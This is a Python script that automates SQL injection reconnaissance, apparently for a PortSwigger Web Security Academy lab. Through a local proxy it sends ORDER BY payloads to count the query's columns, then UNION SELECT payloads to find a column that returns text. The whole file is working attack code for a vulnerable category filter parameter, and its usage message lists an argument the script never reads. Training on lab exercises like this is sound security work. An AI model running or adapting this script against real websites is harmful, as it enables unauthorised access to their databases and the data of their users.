#!/usr/bin/python3
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080'
}

def perform_request(url,sql_payload):
    path = "filter?category=Tech+gifts"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

def exploit_sqli_column_number(url):    
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i       
        res = perform_request(url,sql_payload)   
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

# string is specified by the portswigger to commplete the task.

def exploit_sqli_string_field(url, num_col):
    path = "filter?category=Gifts"  
    for i in range(1, num_col+1):
        string = "'v2F6UA'"
        payload_list = ['NULL'] * num_col
        payload_list[i-1] = string
        sql_payload = "' UNION SELECT " + ', '.join(payload_list) + "--"
        r = requests.get(url + path + sql_payload , verify= False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1==1"' % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    
    if num_col:
        print("[+] The number of columns is "+ str(num_col)+".")
        print("[+] Figuring out which column contains text...")

        string_column = exploit_sqli_string_field(url,num_col)

        if string_column:
            print("[+] The column that contains text is "+ str(string_column)+".")
        else:
            print("[-] We were not able to find a column that has a string data type.")

    else:
        print("[-] The SQLi attack was not successfull.")
